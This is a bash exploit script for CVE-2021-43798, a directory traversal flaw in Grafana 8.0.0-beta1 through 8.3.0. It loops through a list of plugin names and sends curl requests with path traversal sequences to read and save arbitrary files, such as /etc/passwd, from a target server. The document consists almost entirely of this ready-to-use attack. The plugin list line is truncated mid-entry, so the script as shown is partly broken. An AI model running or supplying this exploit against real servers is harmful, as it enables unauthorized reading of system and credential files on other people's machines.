# Exploit Title: Grafana 8.3.0 – Directory Traversal and Arbitrary File Read
# Date: 27-08-2024
# Exploit Author: Sm4rtF0x
# Vendor Homepage: https://grafana.com/
# Software Link: https://grafana.com/grafana/
# Version: 8.0.0-beta1 - 8.3.0 (except for patched versions)
# CVE: CVE-2021-43798
# Usage: bash exploit.sh <target> <port> "<file>"
# E.g.:  bash exploit.sh 192.168.0.2 3000 "/etc/passwd"

#!/bin/bash

# Global variables
ip=$1
port=$2
file=$3
plugins_list=("alertlist" "annolist" "barchart" "bargauge" "candlestick" "cloudwatch" "dashlist" "elasticsearch" "gauge" "geomap" "gettingstarted" "grafana-azure-monitor-datasource" "grap>

# Exploit banner
echo ""
echo "---- Grafana 8.3.0 – Directory Traversal and Arbitrary File Read ----"
echo "---- This exploit is based on CVE-2021-43798 ----"
echo ""

echo "[*] Attempting to exploit target..."

# Verify if target has available plugins to exploit
for plugin in "${plugins_list[@]}"; do
    curl -s -f -L -O --path-as-is "http://$ip:$port/public/plugins/$plugin/../../../../../../../../$file"
    if [ $? -eq 0 ]; then
        echo "[*] Exploit worked! Plugin found: $plugin"
        echo "[*] File was saved to the current directory."
        exit 0
    fi
done

# Failed to exploit
echo "[*] Could not exploit target."
